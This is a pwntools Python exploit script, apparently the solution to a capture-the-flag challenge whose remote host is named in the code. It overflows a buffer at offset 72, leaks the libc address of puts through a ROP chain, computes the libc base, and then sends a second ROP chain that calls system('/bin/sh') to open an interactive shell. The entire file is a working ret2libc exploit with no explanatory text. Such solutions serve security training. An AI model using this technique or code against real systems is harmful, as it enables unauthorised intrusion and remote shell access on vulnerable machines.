from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.binary = elf

# r = elf.process()
r = remote('lmdps.challs.itc-ctf.online', 9229, ssl=True)

offset = 72

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])

payload = [
    b'A' * offset,
    rop.chain(),
    p64(0x0000000000401194) #main
]
payload = b''.join(payload)

r.recv()
r.sendline(payload)
puts = u64(r.recvline().strip().ljust(8, b'\x00'))
print(f'puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload = [
    b'A' * offset,
    p64(0x000000000040101a), #ret
    rop.chain()
]

payload = b''.join(payload)

r.recv()
r.sendline(payload)

r.interactive()
